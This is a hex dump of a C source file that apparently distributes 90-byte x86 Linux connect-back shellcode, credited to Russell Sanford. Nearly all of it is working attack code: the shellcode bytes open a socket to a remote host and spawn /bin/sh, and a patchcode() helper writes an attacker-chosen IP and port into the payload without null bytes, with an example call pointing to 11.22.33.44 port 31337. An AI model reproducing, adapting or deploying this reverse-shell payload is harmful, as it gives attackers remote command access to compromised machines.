00000000  2f 2a 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |/*--------------|
00000010  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000040  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2a 0d 0a  |-------------*..|
00000050  20 2a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  | *              |
00000060  20 20 20 39 30 20 62 79  74 65 20 43 6f 6e 6e 65  |   90 byte Conne|
00000070  63 74 20 42 61 63 6b 20  73 68 65 6c 6c 63 6f 64  |ct Back shellcod|
00000080  65 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |e               |
00000090  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
000000a0  20 2a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  | *              |
000000b0  62 79 20 52 75 73 73 65  6c 6c 20 53 61 6e 66 6f  |by Russell Sanfo|
000000c0  72 64 20 2d 20 78 6f 72  74 40 74 74 79 36 34 2e  |rd - xort@tty64.|
000000d0  6f 72 67 20 20 20 20 20  20 20 20 20 20 20 20 20  |org             |
000000e0  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
000000f0  20 2a 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | *--------------|
00000100  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000130  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2a 0d 0a  |-------------*..|
00000140  20 2a 20 20 20 20 66 69  6c 65 6e 61 6d 65 3a 20  | *    filename: |
00000150  78 38 36 2d 6c 69 6e 75  78 2d 63 6f 6e 6e 65 63  |x86-linux-connec|
00000160  74 2d 62 61 63 6b 2e 63  20 20 20 20 20 20 20 20  |t-back.c        |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000180  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
00000190  20 2a 20 20 20 20 20 20  20 20 69 6e 66 6f 3a 20  | *        info: |
000001a0  43 6f 6d 70 69 6c 65 64  20 77 69 74 68 20 44 54  |Compiled with DT|
000001b0  50 20 50 72 6f 6a 65 63  74 2e 20 20 20 20 20 20  |P Project.      |
000001c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001d0  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
000001e0  20 2a 20 64 69 73 63 72  69 70 74 69 6f 6e 3a 20  | * discription: |
000001f0  54 68 69 73 20 69 73 20  61 20 78 38 36 2d 6c 69  |This is a x86-li|
00000200  6e 75 78 20 63 6f 6e 6e  65 63 74 20 62 61 63 6b  |nux connect back|
00000210  20 73 68 65 6c 6c 63 6f  64 65 2e 20 4a 75 73 74  | shellcode. Just|
00000220  20 69 6e 76 6f 6b 65 20  20 20 20 20 20 2a 0d 0a  | invoke      *..|
00000230  20 2a 20 09 09 74 68 65  20 66 75 6e 63 74 69 6f  | * ..the functio|
00000240  6e 20 70 61 74 63 68 63  6f 64 65 28 29 20 62 65  |n patchcode() be|
00000250  66 6f 72 65 20 75 73 69  6e 67 20 73 68 65 6c 6c  |fore using shell|
00000260  63 6f 64 65 2e 20 54 68  65 20 66 6f 72 6d 61 74  |code. The format|
00000270  20 20 2a 0d 0a 20 2a 20  09 09 66 6f 72 20 69 6e  |  *.. * ..for in|
00000280  76 6f 6b 69 6e 67 20 70  61 74 63 68 63 6f 64 65  |voking patchcode|
00000290  20 69 73 20 61 73 20 66  6f 6c 6c 6f 77 73 3a 20  | is as follows: |
000002a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002b0  20 20 20 20 20 20 20 2a  0d 0a 20 2a 20 20 20 20  |       *.. *    |
000002c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000300  20 20 20 20 20 20 20 2a  0d 0a 20 2a 20 09 09 70  |       *.. * ..p|
00000310  61 74 63 68 63 6f 64 65  28 73 68 65 6c 6c 63 6f  |atchcode(shellco|
00000320  64 65 2c 22 31 31 2e 32  32 2e 33 33 2e 34 34 22  |de,"11.22.33.44"|
00000330  2c 33 31 33 33 37 29 3b  20 20 20 20 20 20 20 20  |,31337);        |
00000340  20 20 20 20 20 20 20 20  20 20 20 20 2a 0d 0a 20  |            *.. |
00000350  2a 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |*---------------|
00000360  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000390  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2a 2f 0d 0a  |------------*/..|
000003a0  0d 0a 63 68 61 72 20 73  68 65 6c 6c 63 6f 64 65  |..char shellcode|
000003b0  5b 5d 20 3d 0d 0a 22 5c  78 33 31 5c 78 63 30 5c  |[] =.."\x31\xc0\|
000003c0  78 36 61 5c 78 30 31 5c  78 35 62 5c 78 35 30 5c  |x6a\x01\x5b\x50\|
000003d0  78 35 33 5c 78 36 61 5c  78 30 32 5c 78 38 39 5c  |x53\x6a\x02\x89\|
000003e0  78 65 31 5c 78 62 30 5c  78 36 36 5c 78 63 64 5c  |xe1\xb0\x66\xcd\|
000003f0  78 38 30 5c 78 35 62 5c  78 34 33 5c 78 35 66 5c  |x80\x5b\x43\x5f\|
00000400  78 36 38 22 0d 0a 22 20  78 6f 72 5c 78 38 31 5c  |x68".." xor\x81\|
00000410  78 30 34 5c 78 32 34 74  40 74 74 5c 78 36 38 79  |x04\x24t@tt\x68y|
00000420  36 34 2e 5c 78 38 31 5c  78 30 34 5c 78 32 34 6f  |64.\x81\x04\x24o|
00000430  72 67 20 5c 78 36 61 5c  78 31 30 5c 78 35 31 5c  |rg \x6a\x10\x51\|
00000440  78 35 30 5c 78 38 39 5c  78 65 31 5c 78 62 30 5c  |x50\x89\xe1\xb0\|
00000450  78 36 36 22 0d 0a 22 5c  78 63 64 5c 78 38 30 5c  |x66".."\xcd\x80\|
00000460  78 35 62 5c 78 33 31 5c  78 63 39 5c 78 36 61 5c  |x5b\x31\xc9\x6a\|
00000470  78 33 66 5c 78 35 38 5c  78 63 64 5c 78 38 30 5c  |x3f\x58\xcd\x80\|
00000480  78 34 31 5c 78 38 30 5c  78 66 39 5c 78 30 33 5c  |x41\x80\xf9\x03\|
00000490  78 37 35 5c 78 66 35 5c  78 33 31 5c 78 63 30 5c  |x75\xf5\x31\xc0\|
000004a0  78 35 30 22 0d 0a 22 5c  78 36 38 5c 78 32 66 5c  |x50".."\x68\x2f\|
000004b0  78 32 66 5c 78 37 33 5c  78 36 38 5c 78 36 38 5c  |x2f\x73\x68\x68\|
000004c0  78 32 66 5c 78 36 32 5c  78 36 39 5c 78 36 65 5c  |x2f\x62\x69\x6e\|
000004d0  78 38 39 5c 78 65 33 5c  78 35 30 5c 78 35 33 5c  |x89\xe3\x50\x53\|
000004e0  78 38 39 5c 78 65 31 5c  78 39 39 5c 78 62 30 5c  |x89\xe1\x99\xb0\|
000004f0  78 30 62 22 0d 0a 22 5c  78 63 64 5c 78 38 30 5c  |x0b".."\xcd\x80\|
00000500  78 65 62 5c 78 66 65 22  3b 0d 0a 0d 0a 69 6e 74  |xeb\xfe";....int|
00000510  20 66 69 6e 64 5f 73 61  66 65 5f 6f 66 66 73 65  | find_safe_offse|
00000520  74 28 69 6e 74 20 49 4e  54 5f 41 29 20 7b 0d 0a  |t(int INT_A) {..|
00000530  0d 0a 09 69 6e 74 20 49  4e 54 5f 42 3d 30 3b 0d  |...int INT_B=0;.|
00000540  0a 09 0d 0a 09 64 6f 20  7b 0d 0a 09 09 49 4e 54  |.....do {....INT|
00000550  5f 41 20 2d 3d 20 30 78  30 31 30 31 30 31 30 31  |_A -= 0x01010101|
00000560  3b 09 49 4e 54 5f 42 20  2b 3d 20 30 78 30 31 30  |;.INT_B += 0x010|
00000570  31 30 31 30 31 3b 0d 0a  09 7d 0d 0a 09 77 68 69  |10101;...}...whi|
00000580  6c 65 20 28 20 28 28 49  4e 54 5f 41 20 26 20 30  |le ( ((INT_A & 0|
00000590  78 30 30 30 30 30 30 66  66 29 20 3d 3d 20 30 29  |x000000ff) == 0)|
000005a0  20 7c 7c 20 0d 0a 09 09  28 28 49 4e 54 5f 41 20  | || ....((INT_A |
000005b0  26 20 30 78 30 30 30 30  66 66 30 30 29 20 3d 3d  |& 0x0000ff00) ==|
000005c0  20 30 29 20 7c 7c 20 0d  0a 09 09 28 28 49 4e 54  | 0) || ....((INT|
000005d0  5f 41 20 26 20 30 78 30  30 66 66 30 30 30 30 29  |_A & 0x00ff0000)|
000005e0  20 3d 3d 20 30 29 20 7c  7c 0d 0a 09 09 28 28 49  | == 0) ||....((I|
000005f0  4e 54 5f 41 20 26 20 30  78 66 66 30 30 30 30 30  |NT_A & 0xff00000|
00000600  30 29 20 3d 3d 20 30 29  20 29 3b 0d 0a 0d 0a 09  |0) == 0) );.....|
00000610  72 65 74 75 72 6e 20 49  4e 54 5f 42 3b 0d 0a 7d  |return INT_B;..}|
00000620  0d 0a 0d 0a 76 6f 69 64  20 70 61 74 63 68 63 6f  |....void patchco|
00000630  64 65 28 63 68 61 72 20  2a 73 68 65 6c 6c 63 6f  |de(char *shellco|
00000640  64 65 2c 20 63 68 61 72  20 2a 49 50 2c 20 69 6e  |de, char *IP, in|
00000650  74 20 50 4f 52 54 29 20  7b 0d 0a 09 0d 0a 09 69  |t PORT) {......i|
00000660  6e 74 20 49 50 5f 41 20  3d 20 69 6e 65 74 5f 61  |nt IP_A = inet_a|
00000670  64 64 72 28 49 50 29 3b  0d 0a 09 69 6e 74 20 49  |ddr(IP);...int I|
00000680  50 5f 42 20 3d 20 66 69  6e 64 5f 73 61 66 65 5f  |P_B = find_safe_|
00000690  6f 66 66 73 65 74 28 49  50 5f 41 29 3b 0d 0a 0d  |offset(IP_A);...|
000006a0  0a 09 69 6e 74 20 50 4f  52 54 5f 41 20 3d 20 28  |..int PORT_A = (|
000006b0  28 6e 74 6f 68 73 28 50  4f 52 54 29 20 3c 3c 20  |(ntohs(PORT) << |
000006c0  31 36 29 20 2b 20 32 29  3b 0d 0a 09 69 6e 74 20  |16) + 2);...int |
000006d0  50 4f 52 54 5f 42 20 3d  20 66 69 6e 64 5f 73 61  |PORT_B = find_sa|
000006e0  66 65 5f 6f 66 66 73 65  74 28 50 4f 52 54 5f 41  |fe_offset(PORT_A|
000006f0  29 3b 09 0d 0a 0d 0a 09  2a 28 69 6e 74 20 2a 29  |);......*(int *)|
00000700  26 73 68 65 6c 6c 63 6f  64 65 5b 31 39 5d 20 3d  |&shellcode[19] =|
00000710  20 28 49 50 5f 41 20 2d  20 49 50 5f 42 29 3b 0d  | (IP_A - IP_B);.|
00000720  0a 09 2a 28 69 6e 74 20  2a 29 26 73 68 65 6c 6c  |..*(int *)&shell|
00000730  63 6f 64 65 5b 32 36 5d  20 3d 20 49 50 5f 42 3b  |code[26] = IP_B;|
00000740  0d 0a 0d 0a 09 2a 28 69  6e 74 20 2a 29 26 73 68  |.....*(int *)&sh|
00000750  65 6c 6c 63 6f 64 65 5b  33 31 5d 20 3d 20 28 50  |ellcode[31] = (P|
00000760  4f 52 54 5f 41 20 2d 20  50 4f 52 54 5f 42 29 3b  |ORT_A - PORT_B);|
00000770  0d 0a 09 2a 28 69 6e 74  20 2a 29 26 73 68 65 6c  |...*(int *)&shel|
00000780  6c 63 6f 64 65 5b 33 38  5d 20 3d 20 50 4f 52 54  |lcode[38] = PORT|
00000790  5f 42 3b 0d 0a 7d                                 |_B;..}|
00000796
